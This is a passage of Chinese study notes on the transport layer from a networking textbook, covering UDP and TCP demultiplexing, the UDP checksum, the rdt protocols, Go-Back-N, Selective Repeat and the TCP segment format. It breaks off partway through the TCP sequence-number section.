<p>例如：主机A和主机B，都向主机C的99端口发送UDP报文段，两个报文段将到达主机C上的同一个套接字。</p>
<h3 id="2-3-面向连接（TCP）的多路复用和多路分解"><a href="#2-3-面向连接（TCP）的多路复用和多路分解" class="headerlink" title="2.3. 面向连接（TCP）的多路复用和多路分解"></a>2.3. 面向连接（TCP）的多路复用和多路分解</h3><p>一个 <strong>TCP套接字</strong> 由 <strong>（源IP地址，源端口号，目的IP地址，目的端口号）组成的四元组</strong> 标识。</p>
<p><strong>因此</strong>：与UDP不同的是，两个具有<strong>不同源IP地址或源端口号</strong>的TCP报文段，即便<strong>目的IP地址和目的端口号相同</strong>，也将被定向到两个<strong>不同的套接字</strong>。</p>
<p>以使用TCP服务的HTTP为例：同台主机上不同的HTTP会话（源IP地址相同，源端口不相同），将对应服务器上不同的套接字；不同主机上的HTTP会话（源IP地址不相同，源端口可能不相同），更对应服务器上不同的套接字。如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/2.png" alt="pic"></p>
<h2 id="3-Connectionless-Transport-UDP-无连接运输：UDP"><a href="#3-Connectionless-Transport-UDP-无连接运输：UDP" class="headerlink" title="3. Connectionless Transport: UDP(无连接运输：UDP)"></a>3. Connectionless Transport: UDP(无连接运输：UDP)</h2><p>UDP的工作：</p>
<ul>
<li>多路复用&#x2F;分解</li>
<li>少量的差错检测</li>
</ul>
<p>UDP的特点：</p>
<ul>
<li>不可靠数据传输，不保证数据到达目的地</li>
<li>将接收到的数据立即发送，不会因链路拥塞而等待</li>
<li>无须建立连接，不会引入连接时延</li>
<li>无连接状态，不需要额外存储状态数据</li>
<li>分组首部开销小</li>
</ul>
<p>使用UDP的运输层协议：DNS等。</p>
<h3 id="3-1-UDP报文段结构"><a href="#3-1-UDP报文段结构" class="headerlink" title="3.1. UDP报文段结构"></a>3.1. UDP报文段结构</h3><p>UDP报文段由 <strong>首部字段（8字节）</strong> 和 <strong>数据</strong> 组成。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/3.png" alt="pic"></p>
<ul>
<li><strong>源端口号（Source port）</strong>：源主机上发送UDP报文段的进程所在的端口。</li>
<li><strong>目的端口号（Dest port）</strong>：目的主机上UDP服务器进程所在的端口。</li>
<li><strong>长度（Length）</strong>：UDP报文段中的字节数。</li>
<li><strong>校验和（Checksum）</strong>：用来检查该报文段是否出现差错。</li>
<li><strong>应用数据（Application data）</strong></li>
</ul>
<h3 id="3-2-UDP校验和"><a href="#3-2-UDP校验和" class="headerlink" title="3.2. UDP校验和"></a>3.2. UDP校验和</h3><p>发送方：</p>
<ol>
<li><p>首先将UDP报文段的<strong>校验和字段</strong>置为0。</p>
</li>
<li><p>将UDP报文段中所有的16比特字相加，求和时遇到任何溢出都要<strong>回卷（将溢出加到结果的低位上）</strong>。示例：</p>
<p> <img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/4.png" alt="pic"></p>
</li>
<li><p>对和的结果进行反码运算。</p>
</li>
<li><p>将最后结果放在UDP报文段的<strong>校验和字段</strong>中。</p>
</li>
</ol>
<p>接收方：</p>
<ol>
<li><p>将UDP报文段中所有的16比特字相加。</p>
</li>
<li><p>如果没有出现差错，则和的结果为：<code>1111 1111 1111 1111</code>。</p>
</li>
</ol>
<p>虽然UDP提供差错检测，但它对差错恢复无能为力。</p>
<h2 id="4-Principles-of-Reliable-Data-Transfer-可靠数据传输原理"><a href="#4-Principles-of-Reliable-Data-Transfer-可靠数据传输原理" class="headerlink" title="4. Principles of Reliable Data Transfer(可靠数据传输原理)"></a>4. Principles of Reliable Data Transfer(可靠数据传输原理)</h2><p>在介绍TCP之前，我们需要先了解可靠数据传输的原理——网络中最为重要的问题之一。</p>
<p>其服务模型和服务实现概况如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/5.png" alt="pic"></p>
<p>实现这种服务抽象是<strong>可靠数据传输协议（reliable data transfer protocol, rdt）</strong>。</p>
<p><strong>注意：此处使用的术语为分组，而不是运输层的报文段</strong>。</p>
<h3 id="4-1-构造可靠数据传输协议"><a href="#4-1-构造可靠数据传输协议" class="headerlink" title="4.1. 构造可靠数据传输协议"></a>4.1. 构造可靠数据传输协议</h3><p>由浅入深完善一个可靠数据传输协议，此书的独到之处，好评！！！</p>
<h4 id="4-1-1-经完全可靠信道的可靠数据传输：rdt1-0"><a href="#4-1-1-经完全可靠信道的可靠数据传输：rdt1-0" class="headerlink" title="4.1.1. 经完全可靠信道的可靠数据传输：rdt1.0"></a>4.1.1. 经完全可靠信道的可靠数据传输：rdt1.0</h4><p>最简单情况下，底层信道是完全可靠的。</p>
<p>发送方和接收方只需要发送和接收数据即可。</p>
<p><strong>发送方</strong>的状态转换图（有限状态机）如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/6.png" alt="pic"></p>
<p><strong>接收方</strong>的状态转换图（有限状态机）如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/7.png" alt="pic"></p>
<p>图释：</p>
<ul>
<li>圆表示一个状态，箭头表示状态变迁。</li>
<li>横线上为引起变迁的事件，横线下为事件发生时所采取的动作。</li>
<li><code>rdt_send(data)</code>：发送高层传来的数据。其动作包括：<code>make_pkt(data)</code> 将数据封装为分组，<code>udt_send(packet)</code> 发送分组（udt表示不可靠数据传输）。</li>
<li><code>rdt_rcv(packet)</code>：接收底层接收一个分组。其动作包括：<code>extract(packet, data)</code> 从分组中取出数据，<code>deliver_data(data)</code> 将数据传递给高层。</li>
</ul>
<h4 id="4-1-2-经具有比特差错信道的可靠数据传输：rdt2-x-自动重传请求协议ARQ"><a href="#4-1-2-经具有比特差错信道的可靠数据传输：rdt2-x-自动重传请求协议ARQ" class="headerlink" title="4.1.2. 经具有比特差错信道的可靠数据传输：rdt2.x - 自动重传请求协议ARQ"></a>4.1.2. 经具有比特差错信道的可靠数据传输：rdt2.x - 自动重传请求协议ARQ</h4><p>此情况下，数据在信道中传输，有可能发生比特差错。</p>
<p>为了让<strong>接收方</strong>最终得到无差错的数据，我们可以如下操作：</p>
<ol>
<li><strong>差错检测</strong>。接收方检测接收的数据是否出现比特差错，通过分组中的校验和字段实现。</li>
<li><strong>接收方反馈</strong>。如果无差错，则反馈 <strong>肯定确认<code>ACK</code></strong> ；反之，则反馈 <strong>否定确认<code>NAK</code></strong> 。</li>
<li><strong>重传</strong>。如果发送方收到否定确认<code>NAK</code>，则重传该分组。</li>
</ol>
<p>基于这样重传机制的可靠数据传输协议，被称为<strong>自动重传请求协议（Automatic Repeat reQuest protocols, ARQ）</strong>。</p>
<h5 id="4-1-2-1-rdt2-0-停等协议"><a href="#4-1-2-1-rdt2-0-停等协议" class="headerlink" title="4.1.2.1. rdt2.0 - 停等协议"></a>4.1.2.1. rdt2.0 - 停等协议</h5><p><strong>发送方</strong>的状态图：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/8.png" alt="pic"></p>
<ul>
<li><code>checksum</code>：用于差错检测的数据。</li>
<li><code>Wait for ACK or NAK</code>：等待ACK或NAK。</li>
<li><code>isNAK(rcvpkt)</code>：接收到的为否定确认。</li>
<li><code>isACK(rcvpkt)</code>：接收到的为肯定确认</li>
<li><code>∧</code>：不进行任何动作。</li>
</ul>
<p><strong>接收方</strong>的状态图：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/9.png" alt="pic"></p>
<ul>
<li><code>corrupt(rcvpkt)</code>：接受的分组存在差错。</li>
<li><code>nocorrupt(rcvplt)</code>：接收的分组不存在差错。</li>
</ul>
<p><strong>发送方</strong>在发送完一个分组后，并不会发送新的分组，除非<strong>发送方</strong>确信<strong>接收方</strong>已正确接收当前分组。由于这种行为，<code>rdt2.0</code>这样的协议又被称为<strong>停等协议</strong>。</p>
<h5 id="4-1-2-2-rdt2-1"><a href="#4-1-2-2-rdt2-1" class="headerlink" title="4.1.2.2. rdt2.1"></a>4.1.2.2. rdt2.1</h5><p>rdt2.0看似完美，但它存在一个致命的缺陷：没有考虑ACK或NAK分组受损的可能性！！！</p>
<p><strong>处理受损ACK或NAK</strong>有3种方法：</p>
<ol>
<li><p>当发送方接收到“含糊不清”的ACK或NAK时，它将反问接收方：“你在说神魔？”。但是，如果发送方的“你在说神魔？”也发生了差错，那将出现更大问题！</p>
</li>
<li><p>增加足够的检验和比特，使发送方不仅可以检测差错，还可以恢复差错。但，这样将花费很多比特。</p>
</li>
<li><p>当发送方收到受损的ACK或NAK时，直接重传当前分组。但，问题在于接收方并不能区分：这是重传的分组，还是新的分组。</p>
</li>
</ol>
<p>为了解决第3种方法产生的问题，有一个简单的办法：<strong>序号（sequence number）</strong>。让发送方对其分组编号，接收方只需要检查序号，即可知道这是重传还是新的分组。</p>
<p>而对于rdt2.0这种简单情况，只需要<code>0</code>和<code>1</code>两个序号就足够了。</p>
<p><strong>发送方</strong>状态图：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/10.png" alt="pic"></p>
<ul>
<li><code>Wait for call 0 from above</code>：等待高层对发送0号分组的调用。</li>
<li><code>sndpkt=make_pkt(0,data,checksum)</code>中的<code>0</code>：分组序号。</li>
<li><code>(corrupt(rcvpkt) || isNAK(rcvpkt))</code> 表示：接收到受损的ACK&#x2F;NAK分组，或者 接收方返回<code>NAK</code>。</li>
<li><code>(nocorrupt(rcvpkt) &amp;&amp; isACK(rcvpkt))</code> 表示：接收到无损的ACK&#x2F;NAK分组，且 接收方返回<code>ACK</code>。</li>
<li>在<code>Wait for ACK or NAK 0</code>等待接收方返回0号分组的ACK&#x2F;NAK分组时：<ul>
<li>如果接收到受损的ACK&#x2F;NAK分组，或者 接收方返回的是<code>NAK</code>，则重传0号分组。</li>
<li>如果接收到无损的ACK&#x2F;NAK分组，且 接收方返回的是<code>ACK</code>，则转入<code>Wait for call 1 from above</code>状态。</li>
</ul>
</li>
</ul>
<p><strong>接收方</strong>状态图：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/11.png" alt="pic"></p>
<ul>
<li><code>has_seq0(rcvpkt)</code>：分组序号是否为0。</li>
<li><code>sndpkt=make_pkt(ACK,checksum)</code>中的<code>checksum</code>：用于ACK&#x2F;NAK分组的差错检测数据。</li>
<li>当在<code>Wait for 1 from below</code>状态等待1号分组时：<ul>
<li>如果接收到受损的分组，则返回<code>NAK</code>分组；</li>
<li>如果接收到无损的0号分组，则返回<code>ACK</code>分组；</li>
<li>如果接收到无损的1号分组，则返回<code>ACK</code>分组，并转入状态<code>Wait for 0 from below</code>。</li>
</ul>
</li>
</ul>
<h5 id="4-1-2-3-rdt2-2"><a href="#4-1-2-3-rdt2-2" class="headerlink" title="4.1.2.3. rdt2.2"></a>4.1.2.3. rdt2.2</h5><p>在rdt2.1的基础上，我们考虑能否不需要NAK呢？</p>
<p>以<code>rdt2.1</code>中<strong>接收方</strong>的<code>Wait for 1 from below</code>状态为例：</p>
<ul>
<li>接收到无损的0号分组，则返回对0号分组的<code>ACK</code>；</li>
<li>接收到无损的1号分组，则返回对1号分组的<code>ACK</code>，并转入下一状态；</li>
<li>接收到受损的分组，则返回<code>NAK</code>。如果不发送<code>NAK</code>，而是对上次正确接收的分组发送<code>ACK</code>，我们也能实现与<code>NAK</code>相同的效果。在<code>Wait for 1 from below</code>状态中，即返回对0号分组的<code>ACK</code>。</li>
</ul>
<p>而<strong>发送方</strong>在<code>Wait for ACK or NAK 1</code>状态下，接收到0号分组的<code>ACK</code>，则相当于接收到<code>NAK</code>，将重传1号分组。</p>
<p>对<code>ACK</code>编号，这就是rdt2.2的改进。</p>
<p><strong>发送方</strong>如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/12.png" alt="pic"></p>
<ul>
<li><code>isACK(rcvpkt,1)</code>：接收到1号分组的<code>ACK</code>。</li>
<li><code>isACK(rcvpkt,0)</code>：接收到0好分组的<code>ACK</code>。</li>
</ul>
<p><strong>接收方</strong>如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/13.png" alt="pic"></p>
<ul>
<li><code>sndpkt=make_pkt(ACK,0,checksum)</code>：封装0号<code>ACK</code>分组。</li>
<li><code>sndpkt=make_pkt(ACK,0,checksum)</code>：封装1号<code>ACK</code>分组。</li>
</ul>
<h4 id="4-1-3-经具有比特差错的丢包信道的可靠数据传输：rdt3-0-比特交替协议"><a href="#4-1-3-经具有比特差错的丢包信道的可靠数据传输：rdt3-0-比特交替协议" class="headerlink" title="4.1.3. 经具有比特差错的丢包信道的可靠数据传输：rdt3.0 - 比特交替协议"></a>4.1.3. 经具有比特差错的丢包信道的可靠数据传输：rdt3.0 - 比特交替协议</h4><p>在此情况下，信道不仅会发生比特差错，还会丢包。</p>
<p>那怎么解决丢包问题呢？<strong>重传</strong>呗。</p>
<p>发送方如果在一段时间后，还没有收到对应分组的<code>ACK</code>，则重传该分组。</p>
<p><strong>发送方</strong>状态转换图如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/16.png" alt="pic"></p>
<ul>
<li><code>start_timer</code>：表示开始计时器。</li>
<li>在<code>Wait for ACK 0</code>状态下：<ul>
<li>如果接收到受损的ACK分组，或1号ACK分组，则啥都不干，坐等超时；</li>
<li>如果<code>timeout</code>超时事件发生，则将重传0号分组，并<strong>重置计时器</strong>；</li>
<li>如果接收到正确的0号ACK分组，则暂停计时器，转入下一状态。</li>
</ul>
</li>
<li>在<code>Wait for call 1 from above</code>状态下，接收到任何分组都置之不理，因为可能是由于延时而产生的冗余分组。</li>
</ul>
<p><strong>接收方</strong>同rdt2.2。</p>
<p>rdt3.0在各种情况下的运行过程：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/14.png" alt="pic"><br><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/15.png" alt="pic"></p>
<p>rdt3.0有时被称为<strong>比特交替协议（alternating-bit protocol）</strong>。</p>
<p>至此，我们得到了一个可靠数据传输协议！！！</p>
<h3 id="4-2-流水线可靠数据传输协议"><a href="#4-2-流水线可靠数据传输协议" class="headerlink" title="4.2. 流水线可靠数据传输协议"></a>4.2. 流水线可靠数据传输协议</h3><p>rdt3.0虽然是一个可靠数据传输协议，但性能并不令人满意。其性能问题的核心在于它是一个<strong>停等协议</strong>。</p>
<p>我们定义<strong>发送方（或信道）的利用率</strong>为：发送方实际忙于将发送比特送进信道的那部分时间与发送时间之比：</p>
<p>$$<br>U_{sender} &#x3D; \frac {L&#x2F;R} {RTT + L&#x2F;R}<br>$$</p>
<ul>
<li>$L$：分组字节长度</li>
<li>$R$：发送方发送速率</li>
<li>$RTT$：往返传播时延</li>
</ul>
<p>可以看出，当$RTT$较大时，利用率将会非常低。</p>
<p>为了解决这个问题，我们可以：不以停等协议运行，允许发送方<strong>同时发送</strong>多个分组而无须等待确认，即<strong>流水线</strong>技术。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/17.png" alt="pic"><br><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/18.png" alt="pic"></p>
<p>但新的技术总伴随着新的问题：</p>
<ul>
<li>必须增加序号范围，因为每个发送的分组必须有一个唯一的序号。</li>
<li>发送方和接收方不得不缓存多个分组。</li>
<li>连续发送的分组中，如何解决分组的差错恢复、丢包重传等问题。两种解决方法：<ul>
<li><strong>回退N步（Go-Back-N，GBN）&#x2F; 滑动窗口协议</strong></li>
<li><strong>选择重传（Selective Repeat，SR）</strong></li>
</ul>
</li>
</ul>
<h4 id="4-2-1-回退N步（GBN）-x2F-滑动窗口"><a href="#4-2-1-回退N步（GBN）-x2F-滑动窗口" class="headerlink" title="4.2.1. 回退N步（GBN）&#x2F; 滑动窗口"></a>4.2.1. 回退N步（GBN）&#x2F; 滑动窗口</h4><p>在回退N步协议中，发送方可以同时发送多个分组，但它受限于某个最大数N。</p>
<p>发送方所维护的GBN协议的序号空间和窗口如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/19.png" alt="pic"></p>
<p>图示：</p>
<ul>
<li><code>base</code>：基序号，指向第一个发送但未收到确认<code>ACK</code>的分组。永远指向窗口头部。</li>
<li><code>nextseqnum</code>：下一个序号，指向第一个待发送的分组。会在窗口中前后滑动。</li>
<li><code>Window size N</code>：滑动窗口的长度<code>N</code>。</li>
<li>包含四种状态的分组：<ul>
<li><code>Already ACK&#39;d - 深蓝</code>：已收到<code>ACK</code>确认的分组。</li>
<li><code>Sent, not yet ACK&#39;d - 浅蓝</code>：已发送，但还未收到<code>ACK</code>确认的分组。</li>
<li><code>Usable, not yet send - 灰色</code>：待发送的分组。</li>
<li><code>Not Usable - 白色</code>：还未准备好的分组。</li>
</ul>
</li>
</ul>
<p>随着协议的运行，窗口在序号空间中向前滑动。实际中，<code>N</code>的大小，受信道拥塞程度的影响。</p>
<p>在GBN协议中，<strong>发送方</strong>需要响应三种类型的事件：</p>
<ul>
<li><p>上层调用其发送数据。发送方首先检查发送窗口是否已满，即<code>nextseqnum - base = N</code>，是否有N个已发送但未收到<code>ACK</code>确认的分组：</p>
<ul>
<li>如果窗口未满，则产生一个分组并发送，更新相应变量；</li>
<li>如果窗口已满，则将数据返回上一层，并指示窗口已满。</li>
</ul>
</li>
<li><p>收到一个ACK。<br>-GBN协议采用<strong>累计确认</strong>的方式：<strong>收到序号为<code>n</code>的<code>ACK</code>分组（对<code>n</code>号分组的确认），表明接收方已正确接收到序号 $\leq n$ 的所有分组</strong>；</p>
<ul>
<li>重启定时器，如果所有分组都已发送和确认，则停止该定时器</li>
</ul>
</li>
<li><p>超时事件。如果出现超时，发送方将重传所有<strong>已发送但未被确认</strong>的分组，这就像协议的名字“回退N步”所说的那样。</p>
</li>
</ul>
<p>在GBN协议中，<strong>接收方</strong>的工作也很简单：</p>
<ul>
<li>如果一个序号为<code>n</code>的分组被正确接收，**并且按序，即上次接收到的分组的序号为<code>n-1</code>**，接收方则返回序号为<code>n</code>的<code>ACK</code>分组。</li>
<li>而对于其它情况，接收方则丢弃接收到的分组，并发送<strong>最近按序接收到的分组</strong>的<code>ACK</code>分组。比如，序号为<code>n</code>的分组被正确接收，但上次收到的分组的序号为<code>n-2</code>，则丢弃<code>n</code>号分组，并发送序号为<code>n-2</code>的<code>ACK</code>分组。</li>
</ul>
<p>下图是一个GBN协议运行的例子：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/20.png" alt="pic"></p>
<h4 id="4-2-2-选择重传（SR）"><a href="#4-2-2-选择重传（SR）" class="headerlink" title="4.2.2. 选择重传（SR）"></a>4.2.2. 选择重传（SR）</h4><p><strong>GBN协议的缺点在于：单个分组的差错将会导致大量分组的重传，而许多分组根本没必要重传</strong>。</p>
<p>而选择重传协议，通过让发送方仅重传那些出现差错的分组，而避免了不必要的重传。</p>
<p>发送方和接收方的序号空间和窗口如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/21.png" alt="pic"></p>
<p>图示：</p>
<ul>
<li><code>send_base</code>：指向发送方第一个发送但未收到确认<code>ACK</code>的分组，永远指向发送方窗口头部。</li>
<li><code>rcv_base</code>：指向接收方第一个期待接收的分组，永远指向接收方窗口头部。</li>
<li>接收方四种状态的分组：<ul>
<li><code>Out of order but already ACK&#39;d - 深蓝</code>：失序但已背确认的分组；</li>
<li><code>Expexted, not yet rec - 浅蓝</code>：期待接收的分组；</li>
<li><code>Acceptable - 灰色</code>：可接受的分组；</li>
<li><code>Not usable - 白色</code>：不可用的分组；</li>
</ul>
</li>
</ul>
<p><strong>发送方</strong>的事件和动作：</p>
<ul>
<li><p>上层调用其发送数据。与GBN协议一样。</p>
</li>
<li><p>收到一个ACK。发送方将该<code>ACK</code>对应的分组标记为已接收，如果该分组的序号为<code>send_base</code>，则窗口向前滑动到具有最小序号的<strong>未确认分组</strong>处。</p>
</li>
<li><p>超时事件。每个分组都必须拥有自己的逻辑定时器，超时发生后只能发送一个分组。</p>
</li>
</ul>
<p><strong>接收方</strong>的事件和动作：</p>
<ul>
<li><p>滑动窗口内的分组（序号在<code>[rcv_base, rcv_base+N-1]</code>内）被正确接收：</p>
<ul>
<li>如果该分组以前没收到过，则缓存该分组；</li>
<li>如果该分组的序号等于<code>rcv_base</code>，则将该序号之后连续的<strong>已缓存分组</strong>交付给上层，并将窗口向前移动到具有最小序号的<strong>期待接受分组</strong>处。</li>
</ul>
</li>
<li><p>滑动窗口前的分组（序号在<code>[rcv_base-N, rcv_base-1]</code>内）被正确接收。<strong>产生一个ACK，即使接收方已经确认接收过该分组（防止ACK未到达发送方）</strong>。</p>
</li>
<li><p>其他情况，忽略该分组。</p>
</li>
</ul>
<p>下图是一个SR协议运行的例子：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/22.png" alt="pic"></p>
<h4 id="4-2-3-有限序号范围的问题"><a href="#4-2-3-有限序号范围的问题" class="headerlink" title="4.2.3. 有限序号范围的问题"></a>4.2.3. 有限序号范围的问题</h4><p>当面对有限序号范围时，由于发送方和接收方窗口之间不可能同步，所以，<strong>接收方面临的困境就是：无法判断该序号的分组是一个新分组还是一次重传</strong>。</p>
<p>包括4个分组序号、窗口长度为3的示例如下：</p>
<p>接收方收到的0号分组为<strong>一次重传</strong>：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/23.png" alt="pic"></p>
<p>接收方收到的0号分组为<strong>一个新分组</strong>：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/24.png" alt="pic"></p>
<p><strong>解决方法</strong>：窗口长度必须小于或等于序号空间大小的一半。</p>
<h3 id="4-3-可靠数据传输机制及其用途的总结"><a href="#4-3-可靠数据传输机制及其用途的总结" class="headerlink" title="4.3. 可靠数据传输机制及其用途的总结"></a>4.3. 可靠数据传输机制及其用途的总结</h3><p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/25.png" alt="pic"></p>
<h2 id="5-Connection-Oriented-Transport-TCP-面向连接的运输：TCP"><a href="#5-Connection-Oriented-Transport-TCP-面向连接的运输：TCP" class="headerlink" title="5. Connection-Oriented Transport: TCP (面向连接的运输：TCP)"></a>5. Connection-Oriented Transport: TCP (面向连接的运输：TCP)</h2><p><strong>TCP&#x2F;IP协议（传输控制协议&#x2F;网际协议，Transmission Control Protocol&#x2F;Internet Protocol）</strong>，是当今因特网的支柱性协议。</p>
<p>TCP概述：</p>
<ul>
<li><strong>面向连接</strong>：在发送数据之前，客户端需要与服务端建立一个连接。三次握手、四次挥手。</li>
<li><strong>可靠传输</strong>：TCP提供可靠数据传输。</li>
<li>全双工：TCP连接提供<strong>全双工服务</strong>。</li>
<li><strong>TCP报文段（TCP segments）</strong>：TCP报文的称呼。</li>
</ul>
<h3 id="5-1-TCP-报文结构"><a href="#5-1-TCP-报文结构" class="headerlink" title="5.1. TCP 报文结构"></a>5.1. TCP 报文结构</h3><p>TCP报文段由两部分组成：</p>
<ul>
<li><strong>首部字段</strong>：一般20字节</li>
<li><strong>数据部分</strong>：数据部分大小受限于<strong>最大报文段长度（MSS，maximum segment size）</strong>。MSS又受限于<strong>最大链路层帧长度&#x2F;最大传输单元（MTU，maximum transmission unit）</strong>，MTU &#x3D; TCP&#x2F;IP首部（一般40字节）+ MSS。以太网和PPP链路层协议的MTU都为1500字节，因此MSS典型值为1460字节。当TCP发送一个大文件时，例如某Web页面的一个图像，TCP会将该文件划分长度为MSS的若干块。</li>
</ul>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/26.png" alt="pic"></p>
<ul>
<li><p><strong>源端口号（Source Port）</strong> 和 <strong>目的端口号（Dest Port）</strong>：用于标识源主机和目的主机上的进程。</p>
</li>
<li><p><strong>序号（Sequence Numbers）</strong> 和 <strong>确认号（Acknowledgment Numbers）</strong>：用于实现可靠数据传输。</p>
<ul>
<li><p><strong>序号</strong>：TCP将数据看成有序的字节流，序号是TCP报文段中<strong>数据部分首字节的字节流编号</strong>。如下图，500000字节的文件，MSS为1000字节，文件被划分成500个TCP报文段，第一个报文段序号为0，第二个报文段序号为1000，以此类推。示例中初始序号为0，实际上<strong>初始序号是随机产生的</strong>——由于网络中有可能存活着旧连接的TCP报文段，这样可以防止新连接阴差阳错地接收到旧连接残留的报文。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/27.png" alt="pic"></p>
</li>
<li><p><strong>确认号</strong>：由于TCP是全双工的，因此主机A在向主机B发送数据时，也会接收来自主机B的数据。主机A报文段中的确认号，就是主机A期望从主机B收到的下一个字节的序号。<strong>同时，表明主机A已经成功收到确认号之前的数据</strong>，这样可以实现可靠数据传输中<strong>累计确认</strong>的功能。</p>
</li>
<li><p>示例（<code>Seq</code>：序号，<code>ACK</code>：确认号）：</p>
